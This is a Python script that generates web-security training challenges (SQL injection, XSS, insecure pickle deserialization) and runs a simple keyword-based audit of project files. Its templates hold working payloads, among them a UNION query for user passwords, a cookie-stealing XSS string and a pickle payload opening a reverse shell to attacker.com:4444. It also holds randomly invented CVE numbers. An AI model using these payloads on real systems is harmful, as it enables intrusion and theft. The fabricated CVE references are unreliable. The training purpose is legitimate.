import json
import os
import random
import argparse
from datetime import datetime

class CyberArsenalFactory:
    def __init__(self):
        self.output_path = "data/arsenal.json"
        self.categories = ["injection", "xss", "rce", "idor", "ssrf", "lfi_rfi", "csrf", "buffer_overflow"]
        
    def generate_challenges(self, count=50):
        print(f"[*] Generating {count} advanced challenges...")
        challenges = []
        
        for i in range(count):
            cat = random.choice(self.categories)
            challenge = self._create_challenge_by_category(cat, i)
            challenges.append(challenge)
            
        self._save_arsenal(challenges)
        print(f"[+] Arsenal saved to {self.output_path}")

    def _create_challenge_by_category(self, cat, idx):
        # High-quality logic for different categories
        templates = {
            "injection": [
                {
                    "desc": "Bypass de login em sistema de admin via injeção cega.",
                    "code": "db.execute(f\"SELECT * FROM admins WHERE user='{user}' AND pass='{pw}'\")",
                    "sol": "admin' AND (SELECT 1)=1--",
                    "type": "blind_sqli"
                },
                {
                    "desc": "Extração de dados via UNION em endpoint de busca.",
                    "code": "const query = `SELECT name, price FROM products WHERE category = '${cat}'`;",
                    "sol": "' UNION SELECT username, password FROM users--",
                    "type": "union_sqli"
                }
            ],
            "xss": [
                {
                    "desc": "XSS via atributo de evento em campo de comentário.",
                    "code": "<div onmouseover=\"handleHover('{input}')\">User Profile</div>",
                    "sol": "'); alert(document.cookie); //",
                    "type": "event_xss"
                },
                {
                    "desc": "Reflected XSS em página de erro 404.",
                    "code": "document.getElementById('error-msg').innerHTML = 'Page not found: ' + window.location.pathname;",
                    "sol": "/<img src=x onerror=alert(1)>",
                    "type": "dom_xss"
                }
            ],
            "rce": [
                {
                    "desc": "RCE via desserialização insegura em Python (Pickle).",
                    "code": "data = pickle.loads(base64.b64decode(request.cookies.get('session')))",
                    "sol": "cos\\nsystem\\n(S'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f'\\ntR.",
                    "type": "insecure_deserialization"
                }
            ]
        }
        
        # Fallback to generic if template not found
        pool = templates.get(cat, [{"desc": f"Advanced {cat} challenge", "code": "// Vulnerable logic", "sol": "exploit", "type": "generic"}])
        base = random.choice(pool)
        
        return {
            "id": f"py-{cat}-{idx}",
            "category": cat,
            "description": base["desc"],
            "vulnerableCode": base["code"],
            "solution": base["sol"],
            "exploitType": base["type"],
            "difficulty": random.choice(["logica", "massiva"]),
            "cveReference": f"CVE-202{random.randint(0,5)}-{random.randint(1000,9999)}",
            "payloadHint": f"Analise o contexto de execução para {cat}. Tente payloads de {base['type']}."
        }

    def _save_arsenal(self, challenges):
        if not os.path.exists("data"):
            os.makedirs("data")
            
        data = {
            "version": "1.0",
            "generated_at": datetime.now().isoformat(),
            "challenges": challenges
        }
        
        with open(self.output_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)

    def security_audit(self):
        print("[*] Starting Project Security Audit...")
        files_to_scan = ["index.html", "js/offline.js", "js/ai_generator.js", "sw.js"]
        findings = []
        
        for file_path in files_to_scan:
            if not os.path.exists(file_path): continue
            
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                
                # Check for hardcoded credentials (simulated)
                if "password" in content.lower() and "=" in content:
                    if "'" in content or '"' in content:
                        findings.append(f"[LOW] Potential hardcoded credential or variable in {file_path}")
                
                # Check for innerHTML usage (XSS vector)
                if ".innerHTML =" in content:
                    findings.append(f"[MEDIUM] Insecure use of innerHTML in {file_path}. Use textContent or DOMPurify.")
                    
                # Check for system() or eval()
                if "eval(" in content or "system(" in content:
                    findings.append(f"[HIGH] Dangerous function detected in {file_path}")

        print("\n=== AUDIT REPORT ===")
        if not findings:
            print("[+] No critical issues found. System looks solid!")
        else:
            for f in findings:
                print(f)
        print("====================\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Cyber Arsenal Factory - Ethical Hacker Support Tool")
    parser.add_argument("--generate", type=int, help="Number of challenges to generate", default=0)
    parser.add_argument("--audit", action="store_true", help="Run security audit on the project")
    
    args = parser.parse_args()
    factory = CyberArsenalFactory()
    
    if args.generate > 0:
        factory.generate_challenges(args.generate)
    
    if args.audit:
        factory.security_audit()
    
    if args.generate == 0 and not args.audit:
        parser.print_help()
